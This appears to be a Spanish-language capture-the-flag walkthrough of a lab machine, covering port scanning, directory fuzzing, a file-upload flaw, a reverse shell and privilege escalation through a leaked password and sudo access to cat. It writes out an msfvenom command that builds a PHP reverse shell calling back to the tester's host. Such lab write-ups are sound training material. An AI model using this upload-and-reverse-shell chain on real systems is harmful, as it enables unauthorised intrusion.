Escaneo de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](../../../Images/Pasted%20image%2020250128185425.png)

Observo lo que corre por el puerto 80:

![](../../../Images/Pasted%20image%2020250128185557.png)

No encontré nada relevante

Pero en la página web me reiteran el dominio hackzones.hl, accedo a él:

![](../../../Images/Pasted%20image%2020250128190500.png)

Tengo un panel de Login

Haré fuzzing web con Gobuster para encontrar posibles directorios:

![](../../../Images/Pasted%20image%2020250128191059.png)

Me llama la atención el directorio /dashboard.html

Accedo a él:

![](../../../Images/Pasted%20image%2020250128191136.png)

Cuando doy click en el botón de "Admin" me doy cuenta que tengo una subida de archivos

![](../../../Images/Pasted%20image%2020250128191204.png)

Crearé una Reverse Shell con Msfvenom y la subiré:
```
msfvenom -p php/reverse_php LHOST=192.168.1.35 LPORT=443 -o shell.php
```

![](../../../Images/Pasted%20image%2020250128191250.png)

Recordando, tengo un directorio /uploads, veré si allí se subió mi archivo:

![](../../../Images/Pasted%20image%2020250128191338.png)

Y si, efectivamente está allí

Me pongo a la escucha con Netcat por el puerto 443 y doy click en mi archivo:

![](../../../Images/Pasted%20image%2020250128191418.png)

Y estoy dentro de la máquina

Tratamiento de la TTY:

![](../../../Images/Pasted%20image%2020250128191642.png)

![](../../../Images/Pasted%20image%2020250128191704.png)

## ESCALADA DE PRIVILEGIOS

En la ruta /var/www/html/supermegaultrasecretfolder, me encuentro con un .sh, lo leo:

![](../../../Images/Pasted%20image%2020250128192825.png)

Es un código codificado en hexadecimal

Lo decodifico:

![](../../../Images/Pasted%20image%2020250128192853.png)

Es una posible contraseña

Observo los usuarios que contiene esta máquina para ver a cual puede pertenecer esta contraseña:

![](../../../Images/Pasted%20image%2020250128193005.png)

Intento escalar al usuario mrrobot:

![](../../../Images/Pasted%20image%2020250128193030.png)

Ahora soy el usuario mrrobot

Flag de user:

![](../../../Images/Pasted%20image%2020250128193105.png)

Ejecuto sudo -l para ver el binario que puedo usar

![](../../../Images/Pasted%20image%2020250128193136.png)

Puedo ser root con el binario Cat

Miro en GTFOBins como puedo escalar con este binario:

![](../../../Images/Pasted%20image%2020250128193203.png)

Lo ejecuto, leyendo el archivo /opt/SistemUpdate:

![](../../../Images/Pasted%20image%2020250128193422.png)

Me encuentro con las credenciales de root

Escalo a root

![](../../../Images/Pasted%20image%2020250128193442.png)

Y listo, ya soy ROOT

Flag de root:

![](../../../Images/Pasted%20image%2020250128193658.png)
